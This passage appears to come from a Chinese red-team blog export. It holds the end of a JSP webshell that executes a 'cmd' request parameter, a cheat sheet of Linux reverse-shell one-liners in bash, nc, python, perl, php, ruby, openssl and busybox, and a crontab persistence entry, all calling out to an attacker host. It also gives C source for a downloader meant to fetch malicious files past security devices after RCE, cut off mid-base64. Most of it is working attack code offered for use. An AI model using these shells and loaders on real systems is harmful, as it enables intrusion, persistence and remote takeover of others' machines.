ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass0&quot;</span>, String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class, ProtectionDomain.class);</span><br><span class="line">    method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Class&lt;?&gt; clazz = (Class&lt;?&gt;) method.invoke(classLoader, <span class="string">&quot;Exp&quot;</span>, code, <span class="number">0</span>, code.length, <span class="keyword">null</span>);</span><br><span class="line">    Constructor&lt;?&gt; constructor = clazz.getConstructor(String.class);</span><br><span class="line">    Object object = constructor.newInstance(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    response.getWriter().println(object.toString());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>注意：只能执行成功一次</p>
<h2 id="13-总结"><a href="#13-总结" class="headerlink" title="13. 总结"></a>13. 总结</h2><p>反射方式是通过<code>Class.forName()</code>获取Runtime对象，然后传入参数执行。</p>
<p>随机数方式是通过随机生成字符拼接成想要的类名或者方法名，达到欺骗的效果。</p>
<p>BeansExpression是通过通过<code>java.beans.Expression</code>来执行<code>getRuntime()</code></p>
<p>其他的，BCEL、自定义ClassLoader、动态编译、ScriptEngine、Native方法的原理都差不多，都是通过加载字节码来执行，不同的就是各种花哨的加载器，就像做shellcode的免杀，都是通过各种加载器来执行机器马，所以本质上各种攻击场景都是有想通之处。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="https://xz.aliyun.com/t/10507">https://xz.aliyun.com/t/10507</a></p>
</li>
<li><p><a href="https://github.com/threedr3am/JSP-Webshells">https://github.com/threedr3am/JSP-Webshells</a></p>
</li>
<li><p><a href="https://space.bilibili.com/1106751850/channel/seriesdetail?sid=560683">https://space.bilibili.com/1106751850/channel/seriesdetail?sid=560683</a></p>
</li>
<li><p><a href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下反弹shell</title>
    <url>/linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/</url>
    <content><![CDATA[<blockquote>
<p>桃李春风一杯酒，江湖夜雨十年灯。</p>
</blockquote>
<p>常见的一些linux反弹shell总结</p>
<span id="more"></span>

<h2 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/172.16.42.1/</span><span class="number">44044</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">非bash环境：<span class="regexp">/bin/</span>bash -c <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/172.16.42.1/44044 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>



<h2 id="zsh反弹"><a href="#zsh反弹" class="headerlink" title="zsh反弹"></a>zsh反弹</h2><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line">靶机：zsh -c <span class="string">&#x27;zmodload zsh/net/tcp &amp;&amp; ztcp 172.16.42.1 44044 &amp;&amp; zsh &gt;&amp;<span class="subst">$REPLY</span> 2&gt;&amp;<span class="subst">$REPLY</span> 0&gt;&amp;<span class="subst">$REPLY</span>&#x27;</span></span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>





<h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2> <figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：netcat <span class="number">172.16</span>.<span class="number">42.1</span> <span class="number">44044</span> -e <span class="regexp">/bin/</span>bash</span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>



<h2 id="nc正向反弹"><a href="#nc正向反弹" class="headerlink" title="nc正向反弹"></a>nc正向反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：nc -lvp <span class="number">7777</span> -e <span class="regexp">/bin/</span>bash</span><br><span class="line">攻击机：nc <span class="number">172.16</span>.<span class="number">43.1</span> <span class="number">7777</span></span><br></pre></td></tr></table></figure>



<h2 id="telnet反弹"><a href="#telnet反弹" class="headerlink" title="telnet反弹"></a>telnet反弹</h2><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">靶机: mknod <span class="keyword">a</span> p; telnet <span class="number">172.16</span><span class="number">.42</span><span class="number">.1</span> <span class="number">44044</span> <span class="number">0</span>&lt;<span class="keyword">a</span> | /bin/bash <span class="number">1</span>&gt;<span class="keyword">a</span></span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>



<h2 id="telnet-mkfifo"><a href="#telnet-mkfifo" class="headerlink" title="telnet+mkfifo"></a>telnet+mkfifo</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">TF=$(mktemp -u); mkfifo <span class="variable">$TF</span> &amp;&amp; telnet <span class="number">172.16</span>.<span class="number">42.150</span> <span class="number">4444</span> <span class="number">0</span>&lt;<span class="variable">$TF</span> | <span class="regexp">/bin/</span>sh <span class="number">1</span>&gt;<span class="variable">$TF</span></span><br></pre></td></tr></table></figure>



<h2 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h2><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">python -c &#x27;import <span class="keyword">socket</span>,subprocess,os;s=<span class="keyword">socket</span>.<span class="keyword">socket</span>(<span class="keyword">socket</span>.AF_INET,<span class="keyword">socket</span>.SOCK_STREAM);s.connect((<span class="string">&quot;172.16.42.1&quot;</span>,<span class="number">44044</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>



<h2 id="perl反弹"><a href="#perl反弹" class="headerlink" title="perl反弹"></a>perl反弹</h2><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;172.16.42.1&quot;</span>;<span class="variable">$p</span>=<span class="number">44044</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>



<h2 id="perl2"><a href="#perl2" class="headerlink" title="perl2"></a>perl2</h2><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">perl -<span class="keyword">e</span> &#x27;<span class="keyword">use</span> IO::Socket;<span class="variable">$p</span>=fork;<span class="keyword">exit</span>,<span class="keyword">if</span>(<span class="variable">$p</span>);<span class="variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="string">&quot;172.16.42.150:4444&quot;</span>);STDIN-&gt;fdopen(<span class="variable">$c</span>,r);$~-&gt;fdopen(<span class="variable">$c</span>,w);system<span class="variable">$_</span> <span class="keyword">while</span>&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="perl-fork"><a href="#perl-fork" class="headerlink" title="perl fork"></a>perl fork</h2><figure class="highlight stata"><table><tr><td class="code"><pre><span class="line">perl -<span class="keyword">e</span> &#x27;<span class="keyword">use</span> IO::Socket;<span class="variable">$p</span>=fork;<span class="keyword">exit</span>,<span class="keyword">if</span>(<span class="variable">$p</span>);<span class="variable">$c</span>=new IO::Socket::INET(PeerAddr,<span class="string">&quot;172.16.42.150:4444&quot;</span>);STDIN-&gt;fdopen(<span class="variable">$c</span>,r);$~-&gt;fdopen(<span class="variable">$c</span>,w);system<span class="variable">$_</span> <span class="keyword">while</span>&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>



<h2 id="open-ssh-反弹"><a href="#open-ssh-反弹" class="headerlink" title="open ssh 反弹"></a>open ssh 反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">mkfifo <span class="regexp">/tmp/</span>s; <span class="regexp">/bin/</span>sh -i &lt; <span class="regexp">/tmp/</span>s <span class="number">2</span>&gt;&amp;<span class="number">1</span> | openssl s_client -quiet -connect <span class="number">172.16</span>.<span class="number">42.150</span>:<span class="number">2333</span> &gt; <span class="regexp">/tmp/</span>s; rm <span class="regexp">/tmp/</span>s</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">openssl req -x509 -newkey rsa:<span class="number">2048</span> -keyout key.pem -out cert.pem -days <span class="number">365</span> -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="number">2333</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="SSH反弹"><a href="#SSH反弹" class="headerlink" title="SSH反弹"></a>SSH反弹</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">ln -sf <span class="regexp">/usr/</span>sbin<span class="regexp">/sshd /</span>tmp<span class="regexp">/su;/</span>tmp/su -oPort=<span class="number">8080</span>;</span><br><span class="line">攻击机：</span><br><span class="line">ssh root@<span class="number">172.16</span>.<span class="number">42.146</span> -p <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">(crontab -l;printf <span class="string">&quot;* * * * *  /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="subst">\&quot;</span>172.16.42.146<span class="subst">\&quot;</span>,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="subst">\&quot;</span>/bin/sh<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>-i<span class="subst">\&quot;</span>]);&#x27;<span class="subst">\n</span>&quot;</span>)|crontab -</span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight tcl"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">php -r &#x27;<span class="variable">$sock</span>=fsockopen(<span class="string">&quot;172.16.42.146&quot;</span>,<span class="number">8080</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">靶机：</span><br><span class="line">ruby -rsocket -e &#x27;exit <span class="keyword">if</span> fork;c=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">new</span>(<span class="string">&quot;172.16.42.146&quot;</span>,<span class="string">&quot;8080&quot;</span>);<span class="keyword">while</span>(cmd=c.gets);<span class="module-access"><span class="module"><span class="identifier">IO</span>.</span></span>popen(cmd,<span class="string">&quot;r&quot;</span>)&#123;<span class="pattern-match">|io|c.print io.read&#125;<span class="keyword">end</span>&#x27;</span></span><br><span class="line"><span class="pattern-match">攻击机：</span></span><br><span class="line"><span class="pattern-match">nc -lvvp 8080</span></span><br></pre></td></tr></table></figure>

<h2 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a>busybox</h2><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">busybox</span> sh -i &gt;&amp; /dev/t<span class="string">&quot;&quot;</span>cp/<span class="number">172.16.42.150</span>/<span class="number">4444</span> <span class="number">0</span>&lt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>





<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://jkme.github.io/pages/reverse-shell.html">https://jkme.github.io/pages/reverse-shell.html</a></p>
<p><a href="https://ninjia.gitbook.io/secskill/net/shell#php">https://ninjia.gitbook.io/secskill/net/shell#php</a></p>
]]></content>
      <categories>
        <category>红队技术</category>
      </categories>
      <tags>
        <tag>Linux安全</tag>
        <tag>反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>linux下载远程恶意文件</title>
    <url>/linux%E4%B8%8B%E8%BD%BD%E8%BF%9C%E7%A8%8B%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<p><font style="color:Gray; float:left">躁胜寒，静胜热，清静为天下正。</font><br></p>
<p><font style="color:Gray; float:right">——《道德经》</font></p>
<br>

<p>在进行红队测试的时候，假如获取到一个linux服务的RCE漏洞，我们可能需要绕过安全设备下载恶意文件，并运行。因此，总结几种手法来下载恶意文件。</p>
<span id="more"></span>



<h2 id="编译c代码下载"><a href="#编译c代码下载" class="headerlink" title="编译c代码下载"></a>编译c代码下载</h2><p>如下c代码类似于wget命令。</p>
<ul>
<li>shadowget.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netdb.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFSIZE 1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 获取http头部信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param fd [in] 	sock套接字</span></span><br><span class="line"><span class="comment"> * @param buf [in] 	存放http头部信息缓冲区</span></span><br><span class="line"><span class="comment"> * @param bufLen [in] 	缓冲区长度</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return 成功：http头部/失败：-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getHttpHead</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">int</span> bufLen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> tmp[<span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> offset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> nbytes = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>((nbytes=recv(fd,tmp,<span class="number">1</span>, <span class="number">0</span>))==<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(offset &gt; bufLen<span class="number">-1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> bufLen;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(i &lt; <span class="number">4</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(tmp[<span class="number">0</span>] == <span class="string">&#x27;\r&#x27;</span> || tmp[<span class="number">0</span>] == <span class="string">&#x27;\n&#x27;</span>) i++;</span><br><span class="line">			<span class="keyword">else</span> i = <span class="number">0</span>;</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">strncpy</span>(buf+offset, tmp, <span class="number">1</span>);</span><br><span class="line">			offset++;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(<span class="number">4</span> == i)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> offset;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 与URL建立连接，并获取sock_fd</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param url [in] 	URL地址</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return sock_fd</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">geturl</span><span class="params">(<span class="keyword">char</span>* url)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span>			cfd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span>	<span class="title">cadd</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hostent</span>		*<span class="title">pURL</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">char</span>			host[BUFSIZE], GET[BUFSIZE];</span><br><span class="line">	<span class="keyword">char</span>			request[BUFSIZE];</span><br><span class="line">	<span class="keyword">char</span>			text[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//分离主机中的主机地址和相对路径</span></span><br><span class="line">	<span class="built_in">memset</span>(host, <span class="number">0</span>, BUFSIZE);</span><br><span class="line">	<span class="built_in">memset</span>(GET, <span class="number">0</span>, BUFSIZE);</span><br><span class="line">	<span class="built_in">memset</span>(request, <span class="number">0</span>, BUFSIZE);</span><br><span class="line">	<span class="built_in">memset</span>(text, <span class="number">0</span>, BUFSIZE);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">sscanf</span>(url, <span class="string">&quot;%*[^//]//%[^/]%s&quot;</span>, host, GET);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;GET = %s\n&quot;</span>, GET);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;host = %s\n&quot;</span>, host);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;url = %s\n&quot;</span>, url);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置socket参数</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">-1</span> == (cfd = socket( AF_INET, SOCK_STREAM, <span class="number">0</span>)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>( <span class="string">&quot;create socket failed of client!\n&quot;</span> );</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//将上面获得的主机信息通过域名解析函数获得域名信息</span></span><br><span class="line">	pURL = gethostbyname(host);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置IP地址结构</span></span><br><span class="line">	bzero(&amp;cadd, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line">	cadd.sin_family			= AF_INET;</span><br><span class="line">	cadd.sin_addr.s_addr	= *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)pURL-&gt;h_addr_list[<span class="number">0</span>]);</span><br><span class="line">	cadd.sin_port			= htons(<span class="number">80</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//向HTTP服务器发送URL信息</span></span><br><span class="line">	<span class="built_in">snprintf</span>(request, BUFSIZE, 		\</span><br><span class="line">				<span class="string">&quot;GET %s HTTP/1.1\r\n&quot;</span></span><br><span class="line">				<span class="string">&quot;HOST: %s\r\n&quot;</span></span><br><span class="line">				<span class="string">&quot;Cache-Control: no-cache\r\n&quot;</span></span><br><span class="line">				<span class="string">&quot;Connection: close\r\n\r\n&quot;</span>,</span><br><span class="line">				GET,host);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\nrequest = \n%s\n&quot;</span>, request);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//连接服务器</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">-1</span> == connect(cfd, (struct sockaddr *)&amp;cadd, (<span class="keyword">socklen_t</span>)<span class="keyword">sizeof</span>(cadd)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>( <span class="string">&quot;connect failed of client!\n&quot;</span> );</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//向服务器发送url请求的request</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="number">-1</span> ==send(cfd, request, <span class="built_in">strlen</span>( request ), <span class="number">0</span> ))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>( <span class="string">&quot;向服务器发送请求的request失败!\n&quot;</span> );</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//客户端接收服务器的返回信息</span></span><br><span class="line">	getHttpHead(cfd, text, <span class="keyword">sizeof</span>(text));</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;head = :\n%s\n&quot;</span>, text);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> cfd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief 获取URL中的文件名</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @param URLPath [in] 	URL地址</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @return 文件名</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">GetFileName</span><span class="params">(<span class="keyword">char</span> *URLPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">char</span> *q = <span class="built_in">strrchr</span>(URLPath, ch) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> q;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> sockfd = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">char</span>		buf[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span>		fileName[BUFSIZE] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="keyword">int</span>			fd = <span class="number">-1</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ( argc &lt; <span class="number">2</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>( <span class="string">&quot;用法:%s url网页网址\n&quot;</span>, argv[<span class="number">0</span>] );</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">strncpy</span>(fileName, GetFileName(argv[<span class="number">1</span>]), BUFSIZE);</span><br><span class="line">	sockfd = geturl(argv[<span class="number">1</span>]);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fileName = %s\n&quot;</span>, fileName);</span><br><span class="line">	remove(fileName);</span><br><span class="line">	</span><br><span class="line">	fd = open(fileName, O_WRONLY | O_CREAT, <span class="number">777</span> );</span><br><span class="line">	<span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror( <span class="string">&quot;OPen error&quot;</span> );</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">memset</span>( buf, <span class="number">0</span>, BUFSIZE );</span><br><span class="line">		<span class="keyword">int</span> cr;</span><br><span class="line">		cr = recv(sockfd, buf, BUFSIZE, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> ( cr &lt;= <span class="number">0</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;break\n&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		write(fd, buf, cr);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	close(fd);</span><br><span class="line">	close(sockfd);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们在攻击机上将其转为base64文件</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">cat shadowget.c <span class="string">| base64 &gt; shadowget.txt</span></span><br></pre></td></tr></table></figure>

<p>结果如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">I2luY2x1ZGUgPHN0ZGlvLmg</span>+CiNpbmNsdWRlIDx<span class="number">1</span>bmlzdGQuaD<span class="number">4</span>KI<span class="number">2</span>luY<span class="number">2</span>x<span class="number">1</span>ZGUgPGZjbnRsLmg+</span><br><span class="line"><span class="attribute">CiNpbmNsdWRlIDxzdHJpbmcuaD4KI2luY2x1ZGUgPG5ldGRiLmg</span>+CgojZGVmaW<span class="number">5</span>lIEJVRlNJWkUg</span><br><span class="line"><span class="attribute">MTAyNAoKLyoqCiAqIEBicmllZiDojrflj5ZodHRw5aS06YOo5L</span>+h<span class="number">5</span>oGvCiAqCiAqIEBwYXJhbSBm</span><br><span class="line"><span class="attribute">ZCBbaW5dIAlzb2Nr5aWX5o6l5a2XCiAqIEBwYXJhbSBidWYgW2luXSAJ5a2Y5pS</span>+aHR<span class="number">0</span>cOWktOmD</span><br><span class="line"><span class="attribute">qOS</span>/oeaBr+e<span class="number">8</span>k+WGsuWMugogKiBAcGFyYW<span class="number">0</span>gYnVmTGVuIFtpbl<span class="number">0</span>gCee<span class="number">8</span>k+WGsuWMuumVv+W<span class="number">6</span>pgog</span><br><span class="line"><span class="attribute">KgogKiBAcmV0dXJuIOaIkOWKn</span>++<span class="number">8</span>mmh<span class="number">0</span>dHDlpLTpg<span class="number">6</span>gv<span class="number">5</span>aSx<span class="number">6</span>LSl<span class="number">77</span>yaLTEKICovCmludCBnZXRI</span><br><span class="line"><span class="attribute">dHRwSGVhZChpbnQgZmQsIGNoYXIgKmJ1ZiwgaW50IGJ1ZkxlbikKewoJY2hhciB0bXBbMV0gPSB7</span></span><br><span class="line"><span class="attribute">MH07CglpbnQgaSA9IDA7CglpbnQgb2Zmc2V0ID0gMDsKCWludCBuYnl0ZXMgPSAwOwoKCXdoaWxl</span></span><br><span class="line"><span class="attribute">KChuYnl0ZXM9cmVjdihmZCx0bXAsMSwgMCkpPT0xKQoJewoJCWlmKG9mZnNldCA</span>+IGJ<span class="number">1</span>Zkxlbi<span class="number">0</span>x</span><br><span class="line"><span class="attribute">KQoJCXsKCQkJcmV0dXJuIGJ1ZkxlbjsKCQl9CgkJCgkJaWYoaSA8IDQpCgkJewoJCQlpZih0bXBb</span></span><br><span class="line"><span class="attribute">MF0gPT0gJ1xyJyB8fCB0bXBbMF0gPT0gJ1xuJykgaSsrOwoJCQllbHNlIGkgPSAwOwoJCQkKCQkJ</span></span><br><span class="line"><span class="attribute">c3RybmNweShidWYrb2Zmc2V0LCB0bXAsIDEpOwoJCQlvZmZzZXQrKzsKCQl9CgkJCgkJaWYoNCA9</span></span><br><span class="line"><span class="attribute">PSBpKQoJCXsKCQkJcmV0dXJuIG9mZnNldDsKCQl9Cgl9CgkKCXJldHVybiAtMTsKfQoKLyoqCiAq</span></span><br><span class="line"><span class="attribute">IEBicmllZiDkuI5VUkzlu7rnq4vov57mjqXvvIzlubbojrflj5Zzb2NrX2ZkCiAqCiAqIEBwYXJh</span></span><br><span class="line"><span class="attribute">bSB1cmwgW2luXSAJVVJM5Zyw5Z2ACiAqCiAqIEByZXR1cm4gc29ja19mZAogKi8KaW50IGdldHVy</span></span><br><span 